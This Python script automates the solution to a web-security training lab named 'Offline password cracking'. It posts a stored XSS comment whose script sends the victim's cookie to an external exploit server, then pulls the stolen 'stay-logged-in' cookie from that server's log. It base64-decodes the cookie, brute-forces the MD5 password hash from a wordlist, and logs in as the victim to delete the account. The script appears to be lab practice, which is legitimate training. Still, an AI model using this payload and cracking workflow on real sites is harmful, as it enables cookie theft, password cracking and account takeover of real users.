# Offline password cracking

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import hashlib
import base64

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def connect_as_wiener(s, url):
	login_path = url + '/login'
	time.sleep(1)
	data_login = {'username': 'wiener', 'password': 'peter'}
	print('\n[+] Sending connection to the application as Wiener...')
	r = s.post(login_path, data=data_login)
	time.sleep(1)
	if 'Your username is: wiener' in r.text:
		return r
	else:
		print('[-] Exploit failed to connect as Wiener <!>')
		sys.exit(1)

def get_cookie(s, url, attacker):
	print("\n[+] Trying to post a comment to steal Carlos's cookies...")
	comment_path = url + '/post/comment'
	post_path = url + '/post?postId=2'
	log_path = f'https://{attacker}/log'
	r = s.get(post_path)
	headers = {'Content-Type': 'application/x-www-form-urlencoded'}
	payload = f"<script>document.location='//{attacker}/'+document.cookie</script>"
	comment_data = {
		'postId': '2',
		'comment': payload,
		'name': 'gwyo',
		'email': 'gwyo@attacker.com',
		'website': ''
	}
	time.sleep(1)
	r = s.post(comment_path, data=comment_data, headers=headers)
	if not 'Your comment has been submitted.' in r.text:
		print('[-] Failed to post the malicious comment')
		sys.exit(1)
	time.sleep(10)
	r = s.get(log_path)
	if 'stay-logged-in' in r.text:
		cookie = re.findall(r'%20stay-logged-in=(.*) HTTP', r.text)[-1]
		print('\n[+] Found "stay-logged-in" cookie:\t%s' % cookie)
		return cookie
	print("[-] Failed to retrieve the victim's cookie <!>")
	sys.exit(1)

def bf_cookie(cookie):
	print('\n[+] Brute-forcing the "stay-logged-in" cookie value...')
	decoded = base64.b64decode(cookie.encode())
	print('[+] Base64 decoded:\t%s' % decoded.decode())
	decoded_hash = decoded.decode().split(':')[1]
	print('[+] Brute-forcing:\t%s' % decoded_hash)
	with open('./passwords.txt') as f:
		for line in f:
			sys.stdout.flush()
			password = line.strip()
			sys.stdout.write('\r[+] Trying password:\t%s%s' % (password, ' ' * (12 - len(password))))
			encoded_password = hashlib.md5(password.encode('utf-8')).hexdigest()
			time.sleep(.05)
			if encoded_password == decoded_hash:
				print('\n\n[+] Found Password:\t%s' % password)
				return password
	print('\n[-] Failed to find the password <!>')
	sys.exit(1)


def connect_as_carlos(s, url, password):
	print('\n[+] Logging in as Carlos with found password...')
	login_path = url + '/login'
	login_data = 'username=carlos&password=' + password
	r = s.post(login_path, data=login_data)
	if 'Your username is: carlos' in r.text:
		print('[+] Logged in as Carlos !')
		return r
	print('[-] Failed to log in as Carlos <!>')
	sys.exit(1)

def delete_user(s, url, password):
	account_path = url + '/my-account'
	delete_path = account_path + '/delete'
	r = s.post(delete_path, allow_redirects=False)
	if r.status_code == 200:
		delete_data = {'password': password}
		r = s.post(delete_path, data=delete_data, allow_redirects=False)
		if r.status_code == 302:
			print('[+] Deleted Carlos account !')
			return r
	print('[-] Failed to delete Carlos account <!>')
	sys.exit(1)

def find_exploit_srv(r):
	if re.search(r"href='(.*)'>Go to exploit server", r.text):
		srv = re.search(r"href='(.*)'>Go to exploit server", r.text).group(1)
		print('[+] Found Exploit server:\n\t%s' % srv)
		return srv

def show_usage():
	print('[+] Usage: %s <URL>' % sys.argv[0])
	print('[+] Example: %s https://www.target.com' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Offline password cracking')
	try:
		url = sys.argv[1].strip()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		exploit_srv = find_exploit_srv(r)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to find a way to access Carlos account...\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host
			attacker = urllib.parse.urlparse(exploit_srv).netloc
			r = connect_as_wiener(s, url)
			cookie = get_cookie(s, url, attacker)
			time.sleep(2)
			password = bf_cookie(cookie)
			s.cookies.clear()
			r = connect_as_carlos(s, url, password)
			time.sleep(2)
			r = delete_user(s, url, password)
			s.cookies.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
